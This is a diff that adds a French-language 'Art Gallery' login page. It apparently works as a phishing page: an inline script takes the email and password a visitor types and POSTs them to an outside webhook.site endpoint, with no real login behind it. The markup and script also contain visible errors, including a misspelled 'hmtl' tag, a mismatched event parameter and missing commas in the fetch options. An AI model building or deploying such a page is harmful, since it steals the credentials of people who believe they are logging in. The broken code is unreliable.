@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<hmtl lang="fr-FR" dir="ltr">
+
+    <head>
+        <meta charset="utf-8">
+        <meta name="author" content="florian maze">
+        <meta name="description" content="....vip">
+        <title>Art Gallery</title>
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@1.0.4/css/bulma.min.css">
+    </head>
+
+    <body>
+        <header>
+            <a href="#">Art Gallery</a>
+        </header>
+        <main style="min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center">
+            <form id="login-form">
+
+                <div class="field">
+                    <p class="control has-icons-left has-icons-right">
+                        <input id="email" class="input" type="email" placeholder="Email">
+                        <span class="icon is-small is-left">
+                            <i class="fas fa-envelope"></i>
+                        </span>
+                        <span class="icon is-small is-right">
+                            <i class="fas fa-check"></i>
+                        </span>
+                    </p>
+                </div>
+                <div class="field">
+                    <p class="control has-icons-left">
+                        <input id="password" class="input" type="password" placeholder="Password">
+                        <span class="icon is-small is-left">
+                            <i class="fas fa-lock"></i>
+                        </span>
+                    </p>
+                </div>
+                <div class="field">
+                    <p class="control">
+                        <button class="button is-success">
+                            Login
+                        </button>
+                    </p>
+                </div>
+
+
+            </form>
+        </main>
+        <script>
+            
+            const form = document.getElementById('login-form');
+            form.addEventListener('submit', function(envent){
+                event.preventDefault();
+                const email= document.getElementById('email');
+                const password = document.getElementById('password');
+                const emailValue = email.value;
+                const passwordValue = password.value;
+
+                fetch('https://webhook.site/fbf88570-164e-43ea-8f13-88c2f7ebe489',{
+                    method: 'POST'
+                    headers:{
+                        "content-Type": "application/json"
+                    }
+                    body: JSON.stringify({
+                        email: emailValue,
+                        password: passwordValue
+                    })
+                })
+            })
+
+        </script>
+    </body>
+
+</hmtl>
